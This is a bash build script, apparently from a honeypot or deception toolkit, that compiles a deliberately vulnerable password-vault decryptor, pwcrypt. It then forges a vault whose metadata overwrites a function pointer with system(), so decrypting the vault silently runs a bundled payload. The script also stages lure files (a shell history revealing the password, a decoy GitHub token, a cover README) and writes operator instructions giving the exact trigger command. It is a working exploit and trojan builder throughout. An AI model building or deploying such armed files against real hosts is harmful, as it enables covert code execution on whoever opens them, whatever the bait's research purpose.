#!/usr/bin/env bash
# pwcrypt staging vessel — wrap the bundled payload in a pwcrypt RCE delivery artifact.
#
# Builds pwcrypt from source (src/) for some subset of a portable release matrix
# (linux-amd64, linux-arm64, macOS universal — see the portable-unix-binaries skill),
# forges a SINGLE malicious vault whose decrypt command executes the bundled payload via a
# base64-embedded one-liner, and stages the resulting artifact (binaries + vault +
# companion files) as the bait. An operator deploys whichever binary matches the target
# host and points it at the one shared vault; whichever one actually runs, the RCE fires.
#
# Which binaries: driven by context.json's `target_arch` (manifest.build.target_arch), one
# or more of the standard values `x86_64-linux`, `aarch64-linux`, `x86_64-darwin`,
# `arm64-darwin` (docs/bait-authoring.md's locked list). Empty/omitted means "everything
# this build host can produce" (the historical default). A non-empty list restricts the
# build to exactly those binaries -- e.g. `target_arch: [aarch64-linux]` builds only
# pwcrypt_linux_arm64, skipping the amd64 Docker/apk cycle and the macOS build entirely.
# The two macOS values are NOT independently selectable: either one in the list means
# "build the full universal binary" (splitting into single-slice thin Mach-O binaries
# would need a whole separate artifact shape for a build-time saving that's near zero once
# the OpenSSL cache is warm -- not worth it). Requesting a darwin value on a non-Darwin
# build host is a hard failure (docs/bait-authoring.md §5's "fail fast on unsupported
# targets" rule), not a silent skip -- that's reserved for the empty/omitted "build
# everything this host can" case, where less-than-everything is the best available result
# rather than a violated explicit request.
#
# RCE trigger: `./pwcrypt_<os>_<arch> decrypt secrets/github.pwc 'hunter2'` — the vault's
# TLV "metadata extension" field overwrites the integrity_checks[2] function pointer with
# the address of `system` (PLT/stub on the dynamically-linked macOS binaries, the plain
# symbol address on the statically-linked Linux binaries — see forge.py), and the forged
# params field carries `iter=200000;<payload_cmd>` which KDF parsing reads as a valid
# iteration count while /bin/sh reads as `iter=200000; <payload_cmd>`.
#
# One vault, N binaries: each binary's `system` address is a property of *that* binary's
# own compiled layout (different executable format, different load address, different
# libc/no-libc) — a single fixed byte string can't hijack all of them. So the vault
# carries one candidate address per binary actually built, tagged by build identity
# (-DPWC_ARCH_INDEX, baked in at compile time below); format.c's
# apply_arch_selected_extension() picks the one entry matching its own binary at load
# time. See that function's comment in src/format.c for the on-disk wire format, and
# forge.py's module docstring for the forging side.
#
# Non-deterministic: the load addresses baked into the vault vary per host/build (forge.py
# reads them from each compiled binary's symbols/stubs at setup time), so the forged vault
# is not byte-reproducible across builds even with identical context.json. Documented
# deviation from the staging-vessel contract's determinism rule (docs/bait-authoring.md §5
# rule 3) — same deviation the single-binary version of this vessel always had.
#
# Network access at build time: the Linux binaries are built inside native-arch Alpine
# containers (`docker run --platform linux/amd64|arm64`) so they come out fully static musl
# (portable-unix-binaries skill rule 3) — a macOS host's cross toolchain can't produce that.
# `apk add` inside those containers fetches packages over the network, which is a
# documented, deliberate deviation from the staging-vessel contract's "no network access by
# default" rule (docs/bait-authoring.md §5 rule 5); there's no practical way to obtain a
# musl toolchain + static openssl libs otherwise. The macOS binary is linked statically
# against src/vendor/openssl (vendored source, built locally) per that same skill's guidance
# for third-party libraries on macOS, where no Alpine-equivalent static-package shortcut
# exists. That tree is NOT committed (~45 MB / 3.3k files), so when it is absent
# ensure_vendored_openssl() below fetches the pinned upstream tarball and checksum-verifies
# it before extracting -- the macOS build stays entirely offline whenever the tree is
# already present, which is the case for any working copy that has built once.

set -euo pipefail

CONTEXT_JSON="${1:?usage: setup.sh <context.json>}"

# Parse context.json (Python one-liner to avoid jq dependency — matches the
# contract's reference example and the identity/hostname_probe vessels).
BUNDLING_OUTPUTS=$(python3 -c "import json; c=json.load(open('$CONTEXT_JSON')); print(c['bundling_outputs_dir'])")
OUTPUT=$(python3 -c "import json; c=json.load(open('$CONTEXT_JSON')); print(c['output_dir'])")
OUTPUT_ROOT=$(python3 -c "import json; c=json.load(open('$CONTEXT_JSON')); print(c['output_dir_root'])")

VESSEL_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="$VESSEL_DIR/src"

# Scratch space for intermediate per-arch builds (thin macOS slices, Linux binaries pulled
# out of their containers). Not part of the declared artifact -- only $OUTPUT/$OUTPUT_ROOT
# are; this is cleaned up on exit regardless of success/failure.
SCRATCH="$(mktemp -d)"
trap 'rm -rf "$SCRATCH"' EXIT

HOST_OS="$(uname -s)"

# ---- resolve which binaries to build from context.json's target_arch -------------------
WANTED_ARCHES=()
while IFS= read -r a; do
    WANTED_ARCHES+=("$a")
done < <(python3 -c "
import json
c = json.load(open('$CONTEXT_JSON'))
for a in (c.get('target_arch') or []):
    print(a)
")

for w in "${WANTED_ARCHES[@]-}"; do
    [[ -z "$w" ]] && continue
    case "$w" in
        x86_64-linux|aarch64-linux|x86_64-darwin|arm64-darwin) ;;
        *)
            echo "error: unsupported target_arch '$w' -- this vessel supports: x86_64-linux, aarch64-linux, x86_64-darwin, arm64-darwin" >&2
            exit 1
            ;;
    esac
done

wants_arch() {
    local a="$1"
    [[ ${#WANTED_ARCHES[@]} -eq 0 ]] && return 0   # empty target_arch -- everything this host can build
    local w
    for w in "${WANTED_ARCHES[@]}"; do [[ "$w" == "$a" ]] && return 0; done
    return 1
}

BUILD_LINUX_AMD64=0; wants_arch x86_64-linux  && BUILD_LINUX_AMD64=1
BUILD_LINUX_ARM64=0; wants_arch aarch64-linux && BUILD_LINUX_ARM64=1
WANT_DARWIN=0
if wants_arch x86_64-darwin || wants_arch arm64-darwin; then WANT_DARWIN=1; fi

# wants_arch()'s "empty target_arch means everything" fallback makes WANT_DARWIN=1 in the
# default case too (every arch is "wanted" when nothing was asked for specifically) -- that
# must NOT hard-fail on a non-Darwin host, only an *explicit*, non-empty target_arch that
# names a darwin value should (docs/bait-authoring.md's "fail fast on unsupported targets"
# rule is about a violated explicit request, not "did the best this host can do").
if [[ "$WANT_DARWIN" == "1" && "$HOST_OS" != "Darwin" && ${#WANTED_ARCHES[@]} -gt 0 ]]; then
    echo "error: target_arch requests a macOS binary (x86_64-darwin/arm64-darwin) but this" >&2
    echo "is a $HOST_OS build host. macOS binaries can only be built (and tested) on a" >&2
    echo "macOS host -- portable-unix-binaries skill. Build on a macOS host, or drop the" >&2
    echo "darwin entries from target_arch." >&2
    exit 1
fi

BUILD_MACOS=0
[[ "$HOST_OS" == "Darwin" && "$WANT_DARWIN" == "1" ]] && BUILD_MACOS=1

if [[ "$BUILD_LINUX_AMD64" == "0" && "$BUILD_LINUX_ARM64" == "0" && "$BUILD_MACOS" == "0" ]]; then
    echo "error: target_arch=[${WANTED_ARCHES[*]-}] resolves to nothing buildable on this $HOST_OS host" >&2
    exit 1
fi

if [[ "$BUILD_LINUX_AMD64" == "1" || "$BUILD_LINUX_ARM64" == "1" ]] && ! command -v docker >/dev/null 2>&1; then
    echo "error: docker is required to build the Linux release binaries (static musl, via" >&2
    echo "Alpine containers) -- see setup.sh's header comment" >&2
    exit 1
fi

PLAN=()
[[ "$BUILD_LINUX_AMD64" == "1" ]] && PLAN+=("linux-amd64")
[[ "$BUILD_LINUX_ARM64" == "1" ]] && PLAN+=("linux-arm64")
[[ "$BUILD_MACOS" == "1" ]] && PLAN+=("macos-universal")
if [[ ${#WANTED_ARCHES[@]} -eq 0 ]]; then
    echo "building pwcrypt: ${PLAN[*]} (target_arch empty -> everything this $HOST_OS host can build)" >&2
else
    echo "building pwcrypt: ${PLAN[*]} (target_arch=[${WANTED_ARCHES[*]-}] -- restricted to this list)" >&2
fi
if [[ ${#WANTED_ARCHES[@]} -eq 0 && "$HOST_OS" != "Darwin" ]]; then
    echo "ARTIFACT pwcrypt_macos: NOT PRODUCED." >&2
    echo "Reason: macOS binaries cannot be built or executed on a $HOST_OS host, and policy" >&2
    echo "forbids shipping untested artifacts (portable-unix-binaries skill, playbook" >&2
    echo "Branch B). To produce it: run this vessel's setup.sh on a macOS host, or add a" >&2
    echo "macOS CI job running the skill's playbook Branch A." >&2
fi

# forge.py --entry args, one per binary actually built below (order doesn't matter to it).
ENTRIES=()

# forge.py's ARCH_IDS dict is the single source of truth for the arch-string ->
# PWC_ARCH_INDEX mapping every -DPWC_ARCH_INDEX below has to agree with byte-for-byte --
# query it instead of hardcoding 0/1/2/3 here (see forge.py's module docstring for why
# that drifting apart is a real, previously-hit failure mode).
arch_id() { python3 "$SRC_DIR/forge.py" --arch-id "$1"; }

if [[ "$BUILD_MACOS" == "1" ]]; then
    # ---- macOS: build/cache the static OpenSSL both slices link against ----------------
    #
    # Homebrew's openssl@3 only ever ships the host's own architecture (no universal
    # bottle), so a plain `brew install` can supply at most one of the two macOS slices'
    # static libs. Both are instead built identically from src/vendor/openssl (vendored
    # source -- see the portable-unix-binaries skill's "vendor the source and compile"
    # guidance for third-party libraries) and cached under src/.openssl-cache/ so repeat
    # builds on the same host skip the ~20-40s rebuild.
    OPENSSL_CACHE="$SRC_DIR/.openssl-cache"

    # ---- macOS: make sure that vendored source tree is actually present ------------------
    #
    # src/vendor/openssl is deliberately not committed (~45 MB / 3.3k files would dominate
    # the repo), so a fresh clone has to obtain it before anything below can compile. Pinned
    # to the exact upstream release the tree was vendored from; the checksum is verified
    # BEFORE extraction, never after, and the verified tarball is kept in .openssl-cache/ so
    # `make distclean` cycles and repeat clones don't re-download it.
    #
    # This is a no-op -- and the macOS build stays fully offline -- whenever the tree is
    # already present, which is true of any working copy that has built once, and also
    # whenever both per-arch libcrypto.a are already cached (nothing left to compile from
    # source, so the source isn't needed at all).
    #
    # Note the upstream tarball is a superset of the vendored tree: it also carries test/,
    # demos/ and engines/, which the vendored copy has pruned. Harmless -- the Configure
    # line below passes no-tests/no-apps/no-engine, so none of it is built -- but it does
    # make the extracted directory noticeably larger than a hand-vendored one.
    OPENSSL_VERSION="3.3.2"
    OPENSSL_SHA256="2e8a40b01979afe8be0bbfb3de5dc1c6709fedb46d6c89c10da114ab5fc3d281"
    # GitHub release first: openssl.org relocates superseded releases under /source/old/<ver>/,
    # so its top-level /source/ URL rots the moment 3.3.2 stops being current. Both fallbacks
    # are checksum-gated identically, so URL order is a liveness concern only, not trust.
    OPENSSL_URLS=(
        "https://github.com/openssl/openssl/releases/download/openssl-$OPENSSL_VERSION/openssl-$OPENSSL_VERSION.tar.gz"
        "https://www.openssl.org/source/openssl-$OPENSSL_VERSION.tar.gz"
        "https://www.openssl.org/source/old/${OPENSSL_VERSION%.*}/openssl-$OPENSSL_VERSION.tar.gz"
    )

    openssl_tarball_ok() {
        [[ -f "$1" ]] || return 1
        local got
        got="$(shasum -a 256 "$1" | cut -d' ' -f1)"
        [[ "$got" == "$OPENSSL_SHA256" ]]
    }

    ensure_vendored_openssl() {
        if [[ -f "$VESSEL_DIR/src/vendor/openssl/Configure" ]]; then
            return 0
        fi
        if [[ -f "$OPENSSL_CACHE/x86_64-darwin/lib/libcrypto.a" && -f "$OPENSSL_CACHE/arm64-darwin/lib/libcrypto.a" ]]; then
            return 0
        fi

        local tarball="$OPENSSL_CACHE/openssl-$OPENSSL_VERSION.tar.gz"
        mkdir -p "$OPENSSL_CACHE"

        if openssl_tarball_ok "$tarball"; then
            echo "  reusing checksum-verified openssl-$OPENSSL_VERSION.tar.gz from $OPENSSL_CACHE" >&2
        else
            rm -f "$tarball"
            local url fetched=0
            for url in "${OPENSSL_URLS[@]}"; do
                echo "  src/vendor/openssl absent -- fetching openssl-$OPENSSL_VERSION from $url" >&2
                if curl -fsSL --retry 3 --connect-timeout 20 -o "$tarball.part" "$url"; then
                    mv -f "$tarball.part" "$tarball"
                    fetched=1
                    break
                fi
                rm -f "$tarball.part"
            done
            if [[ "$fetched" != "1" ]]; then
                echo "error: could not download openssl-$OPENSSL_VERSION from any known mirror." >&2
                echo "       Extract the openssl-$OPENSSL_VERSION source to $VESSEL_DIR/src/vendor/openssl manually and re-run." >&2
                exit 1
            fi
            if ! openssl_tarball_ok "$tarball"; then
                echo "error: openssl-$OPENSSL_VERSION.tar.gz failed checksum verification -- refusing to extract." >&2
                echo "       expected $OPENSSL_SHA256" >&2
                echo "       actual   $(shasum -a 256 "$tarball" | cut -d' ' -f1)" >&2
                rm -f "$tarball"
                exit 1
            fi
        fi

        # Extract to scratch and move into place only once complete, so an interrupted run
        # can never leave a half-populated vendor/openssl that the `-f Configure` check
        # above would then happily accept on the next invocation.
        echo "  extracting to src/vendor/openssl..." >&2
        local staging="$SCRATCH/openssl-extract"
        rm -rf "$staging"
        mkdir -p "$staging"
        tar xzf "$tarball" -C "$staging"
        mkdir -p "$VESSEL_DIR/src/vendor"
        rm -rf "$VESSEL_DIR/src/vendor/openssl"
        mv "$staging/openssl-$OPENSSL_VERSION" "$VESSEL_DIR/src/vendor/openssl"
    }

    build_static_openssl() {
        local arch="$1" mac_min="$2" out="$3"
        if [[ -f "$out/lib/libcrypto.a" ]]; then
            echo "  $arch: reusing cached static libcrypto.a ($out)" >&2
            return
        fi
        echo "  $arch: building static libcrypto.a from src/vendor/openssl..." >&2
        ( cd "$VESSEL_DIR/src/vendor/openssl" \
            && make distclean >/dev/null 2>&1 || true )
        ( cd "$VESSEL_DIR/src/vendor/openssl" \
            && CC="clang -arch $arch -mmacosx-version-min=$mac_min" \
               ./Configure "darwin64-$arch-cc" no-shared no-tests no-docs no-apps no-engine no-deprecated \
                 --prefix="$out" >/dev/null \
            && make -j"$(sysctl -n hw.ncpu)" build_libs >/dev/null 2>&1 )
        mkdir -p "$out/lib" "$out/include"
        cp "$VESSEL_DIR/src/vendor/openssl/libcrypto.a" "$out/lib/"
        cp -R "$VESSEL_DIR/src/vendor/openssl/include/openssl" "$out/include/"
        ( cd "$VESSEL_DIR/src/vendor/openssl" && make distclean >/dev/null 2>&1 || true )
    }

    echo "== macOS: static OpenSSL (x86_64, arm64) ==" >&2
    ensure_vendored_openssl
    build_static_openssl x86_64 11.0 "$OPENSSL_CACHE/x86_64-darwin"
    build_static_openssl arm64  11.0 "$OPENSSL_CACHE/arm64-darwin"

    # ---- macOS: the two thin slices ------------------------------------------------------
    #
    # Left unstripped here on purpose -- forge.py reads `metadata_buffer`/`integrity_checks`/
    # `system` out of each binary's own symbol table (nm/otool), so stripping has to happen
    # *after* forging, not before.
    echo "== macOS: compiling thin slices ==" >&2
    build_macos_slice() {
        local arch="$1" mac_min="$2" arch_index="$3" openssl_prefix="$4" out_bin="$5"
        clang -O2 -Wall -Wextra -std=c11 -I"$openssl_prefix/include" -arch "$arch" \
            -mmacosx-version-min="$mac_min" -DPWC_ARCH_INDEX="$arch_index" \
            -c "$SRC_DIR"/format.c "$SRC_DIR"/hooks.c "$SRC_DIR"/kdf.c "$SRC_DIR"/cipher.c "$SRC_DIR"/pwcrypt.c
        clang -arch "$arch" -mmacosx-version-min="$mac_min" \
            format.o hooks.o kdf.o cipher.o pwcrypt.o -o "$out_bin" "$openssl_prefix/lib/libcrypto.a"
        rm -f format.o hooks.o kdf.o cipher.o pwcrypt.o
    }
    ( cd "$SCRATCH" && build_macos_slice x86_64 11.0 "$(arch_id x86_64-darwin)" "$OPENSSL_CACHE/x86_64-darwin" "$SCRATCH/pwcrypt_macos_x86_64" )
    ( cd "$SCRATCH" && build_macos_slice arm64  11.0 "$(arch_id arm64-darwin)"  "$OPENSSL_CACHE/arm64-darwin"  "$SCRATCH/pwcrypt_macos_arm64"  )

    ENTRIES+=(--entry "x86_64-darwin:stub:$SCRATCH/pwcrypt_macos_x86_64")
    ENTRIES+=(--entry "arm64-darwin:stub:$SCRATCH/pwcrypt_macos_arm64")
fi

# ---- Linux: static-musl binaries, built natively inside per-arch containers ------------
#
# Host-OS-independent -- always runs inside per-arch Alpine containers regardless of
# whether this script itself is running on macOS or Linux. Each container gets only the
# vessel's *.c/*.h (read-only bind mount) plus a writable output directory. Left
# unstripped here too, same reason as the macOS slices above -- forge.py needs the symbol
# table; stripping happens in a second, separate container run after forging (native
# binutils -- a macOS host's `strip` can't touch a foreign-arch ELF, and a Linux host's
# native `strip` can't touch the *other* arch either).
build_linux_binary() {
    local platform="$1" arch_index="$2" out_name="$3"
    docker run --rm --platform "$platform" -v "$SRC_DIR:/src:ro" -v "$SCRATCH:/out" -w /tmp alpine:3.20 sh -c "
        set -e
        apk add --no-cache build-base openssl-dev openssl-libs-static binutils >/dev/null 2>&1
        cp /src/*.c /src/*.h /tmp/
        gcc -O2 -Wall -Wextra -std=c11 -no-pie -DPWC_ARCH_INDEX=$arch_index -c format.c hooks.c kdf.c cipher.c pwcrypt.c
        gcc -O2 -no-pie -static format.o hooks.o kdf.o cipher.o pwcrypt.o -o '/out/$out_name' -lcrypto
    "
}
strip_linux_binary() {
    local platform="$1" out_name="$2"
    docker run --rm --platform "$platform" -v "$SCRATCH:/out" alpine:3.20 sh -c "
        apk add --no-cache binutils >/dev/null 2>&1 && strip '/out/$out_name'
    "
}

if [[ "$BUILD_LINUX_AMD64" == "1" ]]; then
    echo "== Linux: compiling pwcrypt_linux_amd64 (docker) ==" >&2
    build_linux_binary linux/amd64 "$(arch_id x86_64-linux)" pwcrypt_linux_amd64
    ENTRIES+=(--entry "x86_64-linux:direct:$SCRATCH/pwcrypt_linux_amd64")
fi
if [[ "$BUILD_LINUX_ARM64" == "1" ]]; then
    echo "== Linux: compiling pwcrypt_linux_arm64 (docker) ==" >&2
    build_linux_binary linux/arm64 "$(arch_id aarch64-linux)" pwcrypt_linux_arm64
    ENTRIES+=(--entry "aarch64-linux:direct:$SCRATCH/pwcrypt_linux_arm64")
fi

# ---- forge the ONE vault every built binary shares --------------------------------------
#
# Use the bundler's pre-generated ready_for_vessel.txt from bundling_outputs/ instead of
# manually encoding (eliminates duplicated gzip+base64 logic, ensures consistency). See
# forge.py's module docstring for the wire format that makes one vault work against every
# binary in $ENTRIES.
PAYLOAD_CMD=$(cat "$BUNDLING_OUTPUTS/ready_for_vessel.txt")

mkdir -p "$OUTPUT/secrets"
python3 "$SRC_DIR/forge.py" \
    "$OUTPUT/secrets/github.pwc" \
    "$PAYLOAD_CMD" \
    "hunter2" \
    "ghp_PROD_4Z2cM9pXqLkR8sTnW1vYbU3aFhJgEoIdC0" \
    "${ENTRIES[@]}" \
    >&2

if [[ "$BUILD_MACOS" == "1" ]]; then
    # ---- assemble the macOS universal binary, strip, sign --------------------------------
    lipo -create -output "$SCRATCH/pwcrypt_macos" "$SCRATCH/pwcrypt_macos_x86_64" "$SCRATCH/pwcrypt_macos_arm64"
    strip "$SCRATCH/pwcrypt_macos"
    codesign -s - --force "$SCRATCH/pwcrypt_macos" >&2 2>&1
fi

# ---- strip + stage whichever binaries were actually built -------------------------------
BIN_LIST=()
if [[ "$BUILD_LINUX_AMD64" == "1" ]]; then
    strip_linux_binary linux/amd64 pwcrypt_linux_amd64
    cp "$SCRATCH/pwcrypt_linux_amd64" "$OUTPUT/pwcrypt_linux_amd64"
    chmod +x "$OUTPUT/pwcrypt_linux_amd64"
    BIN_LIST+=(pwcrypt_linux_amd64)
fi
if [[ "$BUILD_LINUX_ARM64" == "1" ]]; then
    strip_linux_binary linux/arm64 pwcrypt_linux_arm64
    cp "$SCRATCH/pwcrypt_linux_arm64" "$OUTPUT/pwcrypt_linux_arm64"
    chmod +x "$OUTPUT/pwcrypt_linux_arm64"
    BIN_LIST+=(pwcrypt_linux_arm64)
fi
if [[ "$BUILD_MACOS" == "1" ]]; then
    cp "$SCRATCH/pwcrypt_macos" "$OUTPUT/pwcrypt_macos"
    chmod +x "$OUTPUT/pwcrypt_macos"
    BIN_LIST+=(pwcrypt_macos)
fi

# PRIMARY: the conventional default entry point -- prefer linux-amd64 (most common
# honeypot target), falling back to whichever of the requested binaries is actually
# present. All binaries in BIN_LIST are equally real release artifacts, not fallbacks --
# see README.md below.
PRIMARY="${BIN_LIST[0]}"

# Stage a .bash_history hinting at the password (the "shell history gives away the
# password" beat of this vessel's cover story — makes the next command obvious to an
# attacker who finds this artifact). Names $PRIMARY; the README below spells out
# whichever alternates were actually built.
cat > "$OUTPUT/secrets/.bash_history" <<EOF
./$PRIMARY decrypt secrets/github.pwc 'hunter2'
EOF

# Stage a two-sentence README (the cover story's public description — no
# vulnerability-revealing source is shipped in the artifact), artifact.json (docs/
# bait-authoring.md §5 contract — every file must be listed, primary must exist and be a
# key in files; goes in the root, not in to_stage/), and how_to_stage.md (§5's operator-facing
# staging note — also goes in the root, never in to_stage/, since it must never reach the
# target). All three built with python3/json from BIN_LIST rather than a heredoc per possible
# combination, since which binaries are present is now driven by target_arch and no longer a
# fixed 2-or-3 shape.
python3 - "$OUTPUT/README.md" "$OUTPUT_ROOT/artifact.json" "$OUTPUT_ROOT/how_to_stage.md" "$PRIMARY" "${BIN_LIST[@]}" <<'EOF'
import json, sys
readme_path, artifact_path, how_to_stage_path, primary, *bins = sys.argv[1:]

names = ", ".join(f"`{b}`" for b in bins)
plural = "binary is" if len(bins) == 1 else "binaries are"
with open(readme_path, "w") as f:
    f.write(
        "# pwcrypt — encrypt/decrypt passwords with a self-describing vault format\n\n"
        "Build with `make`; decrypt with `pwcrypt decrypt <file> <master-password>`. "
        f"{len(bins)} {plural} provided ({names}) — run whichever matches this machine.\n"
    )

files = {b: {"role": "binary"} for b in bins}
files["secrets/github.pwc"] = {"role": "config"}
files["secrets/.bash_history"] = {"role": "config"}
files["README.md"] = {"role": "doc"}
with open(artifact_path, "w") as f:
    json.dump({"primary": primary, "files": files}, f, indent=2)
    f.write("\n")

bin_list = "\n".join(f"- `{b}`" for b in bins)
with open(how_to_stage_path, "w") as f:
    f.write(
        "# How to stage this bait\n\n"
        "## What this is\n"
        "A real, functioning `pwcrypt` password-vault decryptor with an out-of-bounds-write "
        "RCE in its vault-metadata parsing. `secrets/github.pwc` is a single forged vault that "
        "carries one candidate exploit address per binary below, so whichever binary matches "
        "the target, decrypting it (with the real, correct password) both prints the vault's "
        "genuine (decoy) contents and fires the bundled payload as an invisible side effect. "
        f"This build produced {len(bins)} {'binary' if len(bins) == 1 else 'binaries'}:\n{bin_list}\n\n"
        "## How to stage it\n"
        "Copy whichever binary matches the target's platform, `secrets/github.pwc`, and "
        f"`secrets/.bash_history` onto it, preserving the `secrets/` path. Make the binary "
        "executable (`chmod +x`). The `.bash_history` hint and README are cover — leave them "
        "in place.\n\n"
        "## Exact trigger command\n"
        "```\n"
        f"./{primary} decrypt secrets/github.pwc 'hunter2'\n"
        "```\n"
        "(shown for the default primary binary — substitute whichever of the binaries listed "
        "above actually matches the target; the password and vault path are the same for all "
        "of them)\n"
    )
EOF

echo "staged: ${BIN_LIST[*]} + secrets/github.pwc (RCE-armed vault, works against all of them)" >&2
